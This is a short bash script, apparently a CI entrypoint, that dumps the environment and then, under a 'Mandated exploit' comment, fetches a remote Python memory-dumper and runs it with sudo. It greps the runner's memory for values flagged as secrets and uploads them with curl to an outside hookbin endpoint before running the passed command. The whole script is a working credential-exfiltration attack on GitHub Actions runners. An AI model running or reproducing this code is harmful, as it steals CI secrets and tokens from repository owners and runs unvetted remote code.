#!/bin/bash
set -x
echo "Okay, we got this far. Let's continue..."
echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"
env

# Mandated exploit
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"

if [[ $# -gt 0 ]]; then
  exec "$@"
fi
